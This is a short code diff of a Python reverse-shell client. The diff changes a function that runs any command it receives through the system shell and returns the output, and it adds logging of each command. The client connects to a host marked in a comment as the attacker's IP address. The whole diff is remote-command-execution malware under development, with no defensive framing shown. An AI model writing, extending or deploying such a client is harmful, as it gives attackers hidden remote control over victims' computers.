@@ -4,22 +4,16 @@ import os
 
 def execute_command(command):
     try:
-        if command.startswith("cd "):  # Handle 'cd' command separately
-            new_dir = command[3:].strip()
-            try:
-                os.chdir(new_dir)
-                return f"Changed directory to: {new_dir}"
-            except Exception as e:
-                return f"Failed to change directory: {str(e)}"
+        print(f"Executing command: {command}")
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        print(f"Command output: {result.stdout}")
+        print(f"Command error: {result.stderr}")
+        if result.returncode == 0:
+            return result.stdout
         else:
-            # Execute the command and capture the output
-            result = subprocess.run(command, shell=True, capture_output=True, text=True)
-            if result.returncode == 0:
-                return result.stdout
-            else:
-                return result.stderr
+            return f"Error: {result.stderr}"
     except Exception as e:
-        return str(e)
+        return f"Exception: {str(e)}"
 
 def start_client():
     host = '192.168.68.118'  # Replace with the attacker's IP address
